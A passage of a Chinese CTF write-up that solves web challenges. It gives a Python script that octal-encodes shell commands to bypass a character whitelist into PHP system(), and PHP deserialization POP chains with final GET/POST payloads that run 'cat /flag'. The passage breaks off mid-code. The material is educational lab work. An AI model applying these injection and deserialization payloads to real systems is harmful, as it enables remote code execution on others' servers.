class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure><p> 就是设了个白名单，只能用白名单中的字符串，ljl给了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">n[<span class="number">8</span>] = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">n[<span class="number">9</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]  <span class="comment">#ord转为ascll，然后oct转为8进制，然后从第三位开始截取</span></span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o                       <span class="comment">#数字加上/  为8进制形式</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span>                 <span class="comment">#开头固定格式，然后就\\来区分数字</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#弹shell</span></span><br><span class="line"><span class="built_in">print</span>(build(<span class="string">&#x27;执行的命令&#x27;</span>))</span><br></pre></td></tr></table></figure><p>若执行<code>cat /flag</code>，则脚本给出的代码为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;<span class="symbol">\$</span>\&#x27;<span class="symbol">\\</span>154<span class="symbol">\\</span>163<span class="symbol">\\</span>40<span class="symbol">\\</span>57\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>解析：第一个<code>$0</code>：是一个特殊的变量，在 bash 中表示当前脚本的名称。<code>&lt;&lt;&lt;</code>：这是 bash 的 Here String 操作符，它用于将字符串作为输入传递给命令。在这里，它将字符串 <code>$0\&lt;\&lt;\&lt;\$\&#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147&#39;</code> 传递给了当前命令。第二个 <code>$0</code> 是作为字符串中的普通字符出现，不是一个特殊变量，它作为普通字符被传递给当前命令。<code>\&lt;\&lt;\&lt;</code> 是一个 herestring 操作符，用于将后面的字符串作为输入。<code>\$\&#39;</code> 表示转义字符序列的开始。<code>\\143\\141\\164\\40\\57\\146\\154\\141\\147</code> 是一些转义字符序列，它们将被转换成 ASCII 字符串 “cat &#x2F;flag”。</p><p>简单来说这段代码就是将字符串 “cat &#x2F;flag” 作为输入传递给当前脚本并执行（tql😍以前从没见过）</p></blockquote><p>payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;<span class="symbol">\$</span>\&#x27;<span class="symbol">\\</span>143<span class="symbol">\\</span>141<span class="symbol">\\</span>164<span class="symbol">\\</span>40<span class="symbol">\\</span>57<span class="symbol">\\</span>146<span class="symbol">\\</span>154<span class="symbol">\\</span>141<span class="symbol">\\</span>147&#x27;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60</a></p><p><a href="https://xz.aliyun.com/t/8581?time__1311=n4+xuDgDBDyDRnzD/D0YoQ+wxAhu7WDfhGiD&alichlgref=https://xz.aliyun.com/t/8581#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0YoQ%2BwxAhu7WDfhGiD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3</a></p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EH+lYDkQo0Qk=4D&alichlgref=https://cn.bing.com/#toc-3">https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH%2BlYDkQo0Qk%3D4D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3</a></p><h3 id="ezPOP（current函数、GC回收机制）"><a href="#ezPOP（current函数、GC回收机制）" class="headerlink" title="ezPOP（current函数、GC回收机制）"></a>ezPOP（current函数、GC回收机制）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>应该是在<code>call_user_func($a,$b)($c)($d)</code>处执行命令，<code>call_user_func($a,$b)($c)($d</code>的含义是先将a的值作为函数，b值作为参数进行执行，返回的结果再当作函数，并以c值为参数，再以返回值为函数，以d值为参数。</p><p><code>$b=$_POST;</code>说明b值是以POST方法提交的字段为键名，参数为键值的一个数组，而<code>unset($b[&#39;a&#39;]);</code>会去掉数组b中键名为a的值，说明数组b中至少两个键名，不然没法执行第一步了都，此时b为一个数组，所以我们需要a是一个能处理数组的函数，浩哥找到个current，官方文档：<a href="https://www.php.net/manual/zh/function.current.php">current - Manual - PHP</a>，current简单来说就是返回当前数组中第一个元素的值，所以POST传参如：a&#x3D;current&amp;b&#x3D;system，就会返回system函数，再对c赋值想要执行的命令即可rce，d赋空值即可</p><p>接下来就是构造链子，想要触发<code>__get()</code>，可以用<code>return $this-&gt;s-&gt;$p;</code>，触发<code>__toString()</code>，可以用<code>echo $this-&gt;c;</code>，故paylaod为：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=new CCC();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span>c=new AAA();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span><span class="function"><span class="title">c</span>-&gt;</span>s=new BBB();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span><span class="function"><span class="title">c</span>-&gt;</span><span class="function"><span class="title">s</span>-&gt;</span>c=<span class="string">&quot;cat /flag&quot;</span></span><br></pre></td></tr></table></figure><p>我们还需要绕过<code>throw new Exception(&quot;noooooob!!!&quot;);</code>，用GC回收机制绕过，推荐文章：<a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/QbywnYGO7Qpq+D&alichlgref=https://www.bing.com/#toc-4">浅析PHP GC垃圾回收机制及常见利用方式</a> </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="type">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="keyword">new</span> <span class="type">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s=<span class="keyword">new</span> <span class="type">BBB</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s-&gt;c=<span class="string">&quot;cat /flag&quot;</span>；</span><br><span class="line"><span class="variable">$b</span>=array(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line">echo serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>得到序列化后的数据：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">2</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;<span class="selector-tag">i</span>:<span class="number">1</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>把<code>i:1;i:0;</code>改为<code>i:0;i:0;</code>，即可绕过抛出异常，故最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>：?xy=a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="attribute">POST</span>：a=current&amp;b=system</span><br></pre></td></tr></table></figure><h3 id="ezSerialize（SplFileObject读文件）"><a href="#ezSerialize（SplFileObject读文件）" class="headerlink" title="ezSerialize（SplFileObject读文件）"></a>ezSerialize（SplFileObject读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>要求<code>token</code>和<code>password</code>的值相同，赋地址就行，poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;token = &amp;<span class="variable">$a</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/fpclosefpclosefpcloseffflllaaaggg.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>链子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__wakeup-&gt;<span class="symbol">:__tostring-&gt;B</span><span class="symbol">:</span><span class="symbol">:__get-&gt;A</span><span class="symbol">:</span><span class="symbol">:__invoke-&gt;C</span><span class="symbol">:</span><span class="symbol">:__call</span></span><br></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 